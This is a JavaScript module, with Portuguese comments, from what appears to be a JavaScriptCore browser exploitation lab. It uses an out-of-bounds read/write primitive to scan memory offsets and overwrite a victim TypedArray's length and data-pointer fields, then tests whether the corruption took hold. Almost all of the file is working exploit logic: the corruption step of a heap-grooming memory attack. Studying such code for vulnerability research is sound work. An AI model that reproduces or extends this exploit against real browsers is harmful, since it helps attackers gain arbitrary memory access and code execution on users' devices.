// js/victim_corruptor.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs'; // Para Groomer.victim_object
import { JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs'; // Importa os offsets ATUALIZADOS e config update

let _CURRENT_TEST_GAP = 0;
let _last_successful_gap = null;
const FNAME_BASE = "VictimCorruptor";

export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
export function getLastSuccessfulGap() { return _last_successful_gap; }
export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
export function resetLastSuccessfulGap() { _last_successful_gap = null; }


async function checkVictimObjectProperties(expectedLength = null, expectedByteLength = null) {
    const FNAME_CHECK = `${FNAME_BASE}.checkVictim`;
    if (!Groomer.victim_object) {
        log("   checkVictim: Objeto vítima não definido.", "warn", FNAME_CHECK);
        return { length_ok: false, bytelength_ok: false, vector_ok: false }; // vector_ok não é realmente verificado aqui
    }
    // Adapte se usar outros tipos de vítima no futuro. Por agora, focado em TypedArray.
    if (!(Groomer.victim_object instanceof Uint8Array ||
          Groomer.victim_object instanceof Uint16Array ||
          Groomer.victim_object instanceof Uint32Array ||
          Groomer.victim_object instanceof Float32Array ||
          Groomer.victim_object instanceof Float64Array)) {
        log(`   checkVictim: Objeto vítima é do tipo ${Groomer.victim_object.constructor.name}. Verificação de propriedades não totalmente implementada para este tipo exato.`, "warn", FNAME_CHECK);
        // Permite continuar para TypedArrays genéricos
    }

    let length_ok = true;
    let bytelength_ok = true;

    if (expectedLength !== null && Groomer.victim_object.length !== expectedLength) {
        log(`   [CHECK-FAIL] Comprimento da vítima: ${Groomer.victim_object.length}, Esperado: ${expectedLength}`, "error", FNAME_CHECK);
        length_ok = false;
    } else if (expectedLength !== null) {
        log(`   [CHECK-OK] Comprimento da vítima: ${Groomer.victim_object.length}`, "good", FNAME_CHECK);
    }

    if (expectedByteLength !== null && Groomer.victim_object.byteLength !== expectedByteLength) {
        log(`   [CHECK-FAIL] ByteLength da vítima: ${Groomer.victim_object.byteLength}, Esperado: ${expectedByteLength}`, "error", FNAME_CHECK);
        bytelength_ok = false;
    } else if (expectedByteLength !== null) {
        log(`   [CHECK-OK] ByteLength da vítima: ${Groomer.victim_object.byteLength}`, "good", FNAME_CHECK);
    }
    return { length_ok, bytelength_ok, vector_ok: true /* placeholder */ };
}


export async function try_corrupt_fields_for_gap(gap_to_test_decimal) {
    const FNAME_TRY_FIELDS = `${FNAME_BASE}.try_corrupt_fields`;
    const current_gap_to_test = parseInt(gap_to_test_decimal); // Garante que é número
    log(`--- Tentando corromper campos para GAP: ${current_gap_to_test} (${toHexS1(current_gap_to_test)}) ---`, 'subtest', FNAME_TRY_FIELDS);
    updateOOBConfigFromUI(); // Garante que as configs OOB estão atualizadas

    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) {
        log("   Tentando ativar primitiva OOB...", 'warn', FNAME_TRY_FIELDS);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Primitiva OOB não está ativa. Abortando.", 'error', FNAME_TRY_FIELDS);
            return { success: false, error: "OOB_INACTIVE", details: {} };
        }
    }

    if (!Groomer.victim_object) {
        log("   AVISO: Objeto vítima (Groomer.victim_object) não está preparado. A corrupção pode não ser verificável via JS.", 'warn', FNAME_TRY_FIELDS);
    }

    const original_victim_length = Groomer.victim_object ? Groomer.victim_object.length : -1;

    // O 'current_gap_to_test' é o offset relativo ao início da janela OOB (Core.getInitialBufferSize())
    // até o início do objeto vítima (JSObject TypedArray).
    const victim_base_offset_in_oob = current_gap_to_test;

    const m_vector_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
    const m_length_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;

    const new_m_length_val = 0x7F0000; // Um valor grande mas não o máximo absoluto, para tentar OOB access na vítima
    const new_m_vector_val_low = 0xDEADBEEF;
    const new_m_vector_val_high = 0xCAFEBABE;
    const new_m_vector_int64 = new AdvancedInt64(new_m_vector_val_low, new_m_vector_val_high);

    let success_flag = false;
    let error_type = null;
    let details = {
        gap_tested: toHexS1(current_gap_to_test),
        original_m_vector: "N/A",
        original_m_length: "N/A",
        written_m_vector: new_m_vector_int64.toString(true),
        written_m_length: toHexS1(new_m_length_val)
    };

    try {
        log(`   Lendo m_vector original em offset OOB relativo: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
        const original_m_vector = Core.oob_read_relative(m_vector_field_offset_in_oob, 8);
        details.original_m_vector = original_m_vector ? original_m_vector.toString(true) : "ERRO_LEITURA";
        log(`     Valor original m_vector (no GAP): ${details.original_m_vector}`, 'leak', FNAME_TRY_FIELDS);

        log(`   Lendo m_length original em offset OOB relativo: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
        const original_m_length = Core.oob_read_relative(m_length_field_offset_in_oob, 4);
        details.original_m_length = original_m_length !== undefined ? toHexS1(original_m_length) : "ERRO_LEITURA";
        log(`     Valor original m_length (no GAP): ${details.original_m_length}`, 'leak', FNAME_TRY_FIELDS);

        log(`   Escrevendo novo m_length (${toHexS1(new_m_length_val)}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_length_field_offset_in_oob, new_m_length_val, 4);

        log(`   Escrevendo novo m_vector (${new_m_vector_int64.toString(true)}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_vector_field_offset_in_oob, new_m_vector_int64, 8);

        log("   Corrupção tentada. Verificando o objeto vítima (se existir)...", 'info', FNAME_TRY_FIELDS);
        await PAUSE_LAB(50);

        if (Groomer.victim_object) {
            log(`     Comprimento original JS da vítima: ${original_victim_length} (${toHexS1(original_victim_length)})`, "info", FNAME_TRY_FIELDS);
            log(`     Comprimento ATUAL JS da vítima: ${Groomer.victim_object.length} (${toHexS1(Groomer.victim_object.length)})`, "analysis", FNAME_TRY_FIELDS);

            if (Groomer.victim_object.length === new_m_length_val) {
                log("     SUCESSO! Comprimento do objeto vítima foi alterado para o valor escrito!", "good", FNAME_TRY_FIELDS);
                success_flag = true;
                setLastSuccessfulGap(current_gap_to_test);
                error_type = "LENGTH_CORRUPTED_SUCCESS";
            } else {
                 log("     AVISO: Comprimento do objeto vítima NÃO corresponde ao valor escrito.", "warn", FNAME_TRY_FIELDS);
                 // Mesmo se não for igual, se for diferente do original, pode ser um sinal.
                 if (Groomer.victim_object.length !== original_victim_length) {
                     log("     Porém, o comprimento mudou do original, o que é PROMISSOR!", "vuln", FNAME_TRY_FIELDS);
                     success_flag = true; // Considerar como um tipo de sucesso
                     setLastSuccessfulGap(current_gap_to_test);
                     error_type = "LENGTH_ALTERED_PARTIAL_SUCCESS";
                 }
            }
            try {
                const high_victim_index = Math.min(new_m_length_val - 1, original_victim_length + 10);
                log(`     Tentando ler Groomer.victim_object[${toHexS1(high_victim_index)}]...`, "info", FNAME_TRY_FIELDS);
                const val = Groomer.victim_object[high_victim_index];
                log(`       Valor lido: ${toHexS1(val)}`, "leak", FNAME_TRY_FIELDS);
            } catch (e_access) {
                log(`     EXCEÇÃO ao acessar vítima após corrupção: ${e_access.name} - ${e_access.message}`, "error", FNAME_TRY_FIELDS);
                log("     Esta exceção PODE indicar sucesso na corrupção (ex: segmentation fault simulado).", "vuln", FNAME_TRY_FIELDS);
                success_flag = true;
                setLastSuccessfulGap(current_gap_to_test);
                error_type = e_access.name || "VICTIM_ACCESS_EXCEPTION";
            }
        } else {
            log("   Nenhum objeto vítima para verificar. Sucesso da corrupção não pode ser diretamente confirmado via JS.", "warn", FNAME_TRY_FIELDS);
            success_flag = true; // Sem vítima, sucesso se não houver erro OOB fatal
            error_type = "NO_VICTIM_FOR_JS_CHECK";
        }

        // Tentar restaurar os valores originais para permitir mais testes
        if (details.original_m_length !== "ERRO_LEITURA" && details.original_m_length !== "N/A") {
            log(`   Restaurando m_length original (${details.original_m_length}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_length_field_offset_in_oob, parseInt(details.original_m_length.substring(2),16), 4);
        }
        if (details.original_m_vector !== "ERRO_LEITURA" && details.original_m_vector !== "N/A") {
            log(`   Restaurando m_vector original (${details.original_m_vector}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_vector_field_offset_in_oob, new AdvancedInt64(details.original_m_vector), 8);
        }

    } catch (e_oob) {
        log(`   ERRO FATAL durante operações OOB para GAP ${current_gap_to_test}: ${e_oob.name} - ${e_oob.message}`, 'error', FNAME_TRY_FIELDS);
        // Um erro de OOB (especialmente RangeError ao tentar ler/escrever fora do buffer real)
        // também pode indicar que o GAP calculado para os campos da vítima estava fora dos limites acessíveis.
        success_flag = false; // Se a própria operação OOB falhou catastroficamente, não é um "sucesso" de corrupção.
        error_type = e_oob.name || "OOB_OPERATION_EXCEPTION";
        // Não setar lastSuccessfulGap aqui, pois a operação OOB em si falhou.
         if (e_oob instanceof RangeError && e_oob.message.toLowerCase().includes("fora dos limites do buffer real")) {
             log(`     Este GAP (${toHexS1(current_gap_to_test)}) para os campos da vítima parece estar fora dos limites do buffer OOB principal.`, 'warn', FNAME_TRY_FIELDS);
             return { success: false, error: "FIELD_TARGETING_OUT_OF_BOUNDS", details };
        }
    }
    const logType = success_flag ? (error_type === "LENGTH_CORRUPTED_SUCCESS" ? 'good' : 'vuln') : 'warn';
    log(`--- Tentativa de corrupção para GAP ${current_gap_to_test} concluída. Status: ${success_flag ? 'SUCESSO/PROMISSOR' : 'FALHA/INCERTO'}, Tipo: ${error_type} ---`, logType, FNAME_TRY_FIELDS);
    return { success: success_flag, error: error_type, details };
}

export async function findAndCorruptVictimFields_Iterative(gapStartStr, gapEndStr, gapStepStr, victimSizeStr) {
    const FNAME = `${FNAME_BASE}.findAndCorruptIterative`;
    log(`--- Iniciando Busca Iterativa de GAP & Corrupção ---`, "test", FNAME);

    const gapStart = parseInt(gapStartStr);
    const gapEnd = parseInt(gapEndStr);
    const gapStep = parseInt(gapStepStr);
    const victimSize = parseInt(victimSizeStr);

    if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep <= 0) {
        log("ERRO: Parâmetros de GAP inválidos para busca iterativa.", "error", FNAME);
        return;
    }
     if (isNaN(victimSize)) {
        log("ERRO: Tamanho da vítima inválido.", "error", FNAME);
        // return; // Pode continuar sem vítima para testes de crash apenas com GAPs
    }


    log(`   Range de GAP: ${gapStart} (${toHexS1(gapStart)}) a ${gapEnd} (${toHexS1(gapEnd)}), Passo: ${gapStep}`, "info", FNAME);
    if (!isNaN(victimSize) && victimSize > 0) log(`   Tamanho da Vítima para Grooming: ${victimSize}`, "info", FNAME);
    else log("   AVISO: Tamanho da vítima não especificado ou inválido. Grooming/verificação da vítima JS não será feito.", "warn", FNAME);


    resetLastSuccessfulGap();
    updateOOBConfigFromUI(); // Garante configs OOB

    if (!Core.oob_array_buffer_real && gapEnd >= 0) {
        log("   AVISO: Primitiva OOB não parece estar ativa. Ativando...", "warn", FNAME);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Falha ao ativar primitiva OOB. Abortando busca.", "error", FNAME);
            return;
        }
    }
    
    if (!Groomer.victim_object && !isNaN(victimSize) && victimSize > 0) {
        log("   Preparando objeto vítima para a busca...", "info", FNAME);
        await Groomer.prepareVictim(victimSize); // Groomer.prepareVictim deve retornar true/false
        if (!Groomer.victim_object) {
            log("   AVISO: Falha ao preparar objeto vítima. A verificação da corrupção via JS será limitada.", "warn", FNAME);
        }
    }

    for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
        setCurrentTestGap(current_gap);
        log(`Testando GAP atual: ${current_gap} (${toHexS1(current_gap)})`, "info", `${FNAME}.Loop`);
        
        const currentGapUIEl = document.getElementById('current_gap_display');
        if (currentGapUIEl) currentGapUIEl.textContent = `${current_gap} / ${toHexS1(current_gap)}`;

        const result = await try_corrupt_fields_for_gap(current_gap);

        if (result.success) {
            log(`   GAP PROMISSOR ENCONTRADO: ${current_gap} (${toHexS1(current_gap)})! Tipo de Sucesso/Erro: ${result.error}`, "vuln", FNAME);
            log(`     Detalhes: m_vec_orig: ${result.details?.original_m_vector}, m_len_orig: ${result.details?.original_m_length}`, "leak", FNAME);
            log("   Parando busca no primeiro GAP promissor.", "info", FNAME);
            break; 
        }

        await PAUSE_LAB(100);
        if (document.hidden) { log("Busca abortada, página não visível.", "warn", FNAME); break; }
        
        if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && current_gap !== gapEnd ) {
             // Ajusta para garantir que o último valor (gapEnd) seja testado se o passo não o cobrir exatamente.
            if ( (gapEnd - current_gap) < gapStep && (gapEnd - current_gap) > 0) {
                // Se o próximo passo ultrapassa, mas ainda não atingiu o fim,
                // testa o gapEnd na próxima iteração se não for o current_gap.
                // Este bloco pode precisar de ajuste fino dependendo do comportamento desejado.
                // A maneira mais simples é deixar o loop ir e ele não fará a iteração > gapEnd.
                // Se for importante testar *exatamente* gapEnd, o loop deve ser `current_gap <= gapEnd`.
            }
        }
    }

    if (getLastSuccessfulGap() !== null) {
        log(`Busca iterativa concluída. GAP DE SUCESSO IDENTIFICADO: ${getLastSuccessfulGap()} (${toHexS1(getLastSuccessfulGap())})`, "good", FNAME);
        log("   Este GAP provavelmente permitiu corromper campos da vítima ou atingiu memória sensível.", "vuln", FNAME);
    } else {
         log("Busca iterativa concluída. Nenhum GAP causou um crash/exceção óbvia ou mudança de length verificável que tenha sido classificada como 'sucesso'.", "warn", FNAME);
    }
    setCurrentTestGap(0);
    const currentGapUIEl = document.getElementById('current_gap_display');
    if (currentGapUIEl) currentGapUIEl.textContent = "-";
}

export async function testCorruptKnownGapButtonHandler() {
    const FNAME_TCKG_BTN = `${FNAME_BASE}.testCorruptKnownGapBtn`;
    const gapInputEl = document.getElementById('gap_to_test_input');
    let gapToTest;

    if (gapInputEl && gapInputEl.value.trim() !== "") {
        const gapStr = gapInputEl.value.trim();
        if (gapStr.toLowerCase().startsWith("0x")) {
            gapToTest = parseInt(gapStr, 16);
        } else {
            gapToTest = parseInt(gapStr, 10);
        }
        if (isNaN(gapToTest)) {
            log(`Valor do GAP no input '${gapStr}' é inválido. Tentando usar último GAP de sucesso se disponível.`, "warn", FNAME_TCKG_BTN);
            gapToTest = getLastSuccessfulGap();
        }
    } else {
        gapToTest = getLastSuccessfulGap();
    }
    
    if (gapToTest === null || isNaN(gapToTest)) {
        log("Nenhum GAP válido (último sucesso ou input) para testar. Forneça um GAP no campo 'GAP para Teste Direto'.", "error", FNAME_TCKG_BTN);
        return;
    }
    // Atualiza o input para refletir o valor que será usado, em decimal
    if (gapInputEl) gapInputEl.value = gapToTest;


    log(`Testando corrupção no GAP: ${gapToTest} (${toHexS1(gapToTest)})`, "test", FNAME_TCKG_BTN);
    await try_corrupt_fields_for_gap(gapToTest);
}
